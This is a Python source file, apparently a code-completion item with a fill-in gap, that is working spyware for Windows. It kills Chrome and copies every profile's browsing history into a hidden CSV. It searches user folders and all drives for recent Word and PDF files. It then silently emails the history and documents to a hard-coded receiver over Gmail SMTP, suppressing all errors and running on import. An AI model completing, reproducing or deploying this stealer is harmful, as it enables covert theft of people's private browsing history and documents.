import mimetypes
import time
import smtplib
from email.message import EmailMessage
<FILL_HERE>
import sqlite3
import shutil
from datetime import datetime, timedelta
# import browserhistory as bh

# The mail addresses and password

SENDER = ""  # Syntax: <Example.email1@gmail.com>
SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
RECEIVER = ""  # Syntax: <Example.email2@gmail.com>

def get_chrome_history():
    # close chrome if it is open
    try:
        os.system("taskkill /f /im chrome.exe")
    except Exception:  # NOQA
        pass

    try:
        if os.path.exists("C:\\temp\\.tempcache.csv"):
            os.remove("C:\\temp\\.tempcache.csv")
    except Exception:  # NOQA
        pass

    # base path for Chrome's User Data directory
    base_path = os.path.join(os.getenv("APPDATA"), "..\\Local\\Google\\Chrome\\User Data")

    # list all subdirectories in the User Data directory
    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and (d.startswith('Profile') or d == 'Default')]

    for profile in profiles:
        history_path = os.path.join(base_path, profile, 'History')
        if os.path.exists(history_path):
            temp_history_path = os.path.join("C:\\temp", f'{profile}_History')
            shutil.copyfile(history_path, temp_history_path)

            # connect to the SQLite database
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")

            def chrome_time_to_datetime(chrome_time):
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
            rows = [(url, title, chrome_time_to_datetime(int(last_visit_time))) for url, title, last_visit_time in cursor.fetchall()]

            # write to csv file but don't delete the previous data
            with open("C:\\temp\\.tempcache.csv", mode='a', newline='', encoding='utf-8') as decrypt_password_file:
                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                decrypt_password_writer.writerows(rows)

            # close the database connection
            conn.close()


def clairvoyance():
    """
    Get all the name of the files in the pc
    """
    # Get the current pc username
    user = os.getlogin()
    file_set = set()
    # Requirements for files
    DETECT_TUPLE = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Desktop", f"C:\\Users\\{user}\\Documents",
                    f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
    EXTENSION = (".docx", ".pdf")  # Detect the extension name
    DETECT_KEYWORD = ("", )  # detect any keywords within the file, make it lowercase.
    days = 20  # How many days since last modified back to search

    # Add the rest of the drives to the tuple
    drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
    drives.remove("C:")
    # add \\
    drives = [x + "\\" for x in drives]
    DETECT_TUPLE += tuple(drives)

    # Get all the files in the pc
    for path in DETECT_TUPLE:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")) and \
                        (any(x in file.lower() for x in DETECT_KEYWORD)):
                    try:
                        # get the last modified time of the file
                        last_modified = os.path.getmtime(os.path.join(root, file))
                        if time.time() - last_modified < days * 24 * 60 * 60:  # check if it's in the last x days
                            file_set.add(os.path.join(root, file))  # add it to the set
                            # Limit the number of files to 99
                            if file_set.__len__() >= 99:
                                break
                    except Exception:  # NOQA
                        pass
    return file_set

def send_priority(subject, filename):
    msg = EmailMessage()
    msg["Subject"] = f"Report, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"{subject} for {os.getlogin()}")

    try:
        # attach the csv file
        with open(filename, "rb") as f:
            if f is None:
                return None

            ctype, encoding = mimetypes.guess_type(filename)
            if ctype is None or encoding is not None:
                ctype = "application/octet-stream"
            maintype, subtype = ctype.split("/", 1)

            file_data = f.read()
            file_name = f.name.split("\\")[-1]
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER, SENDER_P)
            smtp.send_message(msg)
            smtp.quit()

        os.remove(filename)
    except Exception:  # NOQA
        pass

def access_and_send(*args):
    """
    Access the files and send it through SMTPlib
    """
    counter = 0

    msg = EmailMessage()
    msg["Subject"] = f"Files, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"Report for {time.strftime('%d/%m/%Y')}, desktop name: {os.getlogin()}")
    
    for i in args:
        for j in i:
            if j is None:
                continue
            try:
                with open(j, "rb") as f:
                    ctype, encoding = mimetypes.guess_type(j)
                    if ctype is None or encoding is not None:
                        ctype = "application/octet-stream"
                    maintype, subtype = ctype.split("/", 1)

                    file_data = f.read()
                    file_name = f.name.split("\\")[-1]
                    msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)
            except Exception:  # NOQA
                pass

            counter += 1
            if counter == 10:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                    smtp.login(SENDER, SENDER_P)
                    smtp.send_message(msg)
                    smtp.quit()
                counter = 0

        # Once the loop finishes, send the remaining
        if counter != 0:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(SENDER, SENDER_P)
                smtp.send_message(msg)
                smtp.quit()
            counter = 0

# Do not do __main__
priority_files = []
try:
    get_chrome_history()
except Exception:  # NOQA
    pass
try:
    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
except Exception:  # NOQA
    time.sleep(20)
    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
try:
    access_and_send(priority_files)
except Exception:  # NOQA
    pass
try:
    access_and_send(clairvoyance())
except Exception:  # NOQA
    pass